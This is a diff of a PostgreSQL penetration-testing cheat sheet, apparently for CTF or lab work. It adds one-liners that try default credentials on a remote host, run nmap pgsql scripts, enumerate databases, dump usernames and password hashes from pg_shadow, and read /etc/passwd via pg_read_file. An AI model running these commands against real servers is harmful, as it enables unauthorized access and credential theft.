@@ -16,32 +16,30 @@
 
 ## Enumeration
 
-### Check Connect
+### Quick Check (One-liner)
 
 ```shell
-psql -h $rhost -p 5432 -U postgres -d postgres
+# Test default credentials
+PGPASSWORD='postgres' psql -h $rhost -U postgres -c "SELECT version();" 2>/dev/null && echo "[+] Default creds work!"
+
+# Nmap scripts
+nmap -p 5432 --script "pgsql-*" $rhost
 ```
 
-```shell
-psql -h $rhost -p 5433 -U postgres -d postgres --sslmode=require
-```
-
-#### Command
+### Database Enumeration (One-liner)
 
 ```shell
-\l  # หรือ \list
-\l+  # Extended list (รวม size, tablespace)
-SELECT datname FROM pg_database WHERE datistemplate = false;  # List non-template dbs
-\c mydatabase  # Switch to db (\c postgres)
-\dt  # List tables
-\dt+  # Extended (size, description)
-\dn  # List schemas
-\dv  # List views
-\df  # List functions
-\df+ function_name  # Show code of specific function
-\du  # List users/roles
-\d+ table_name  # Describe table (columns, indexes)
-\x  # Toggle expanded display
+# List all databases
+PGPASSWORD='$pass' psql -h $rhost -U $user -c "SELECT datname FROM pg_database;"
+
+# List all tables in current db
+PGPASSWORD='$pass' psql -h $rhost -U $user -d $database -c "SELECT tablename FROM pg_tables WHERE schemaname='public';"
+
+# List users
+PGPASSWORD='$pass' psql -h $rhost -U $user -c "SELECT usename,passwd FROM pg_shadow;"
+
+# Read file
+PGPASSWORD='$pass' psql -h $rhost -U $user -c "SELECT pg_read_file('/etc/passwd');"
 ```
 
 - Create New User
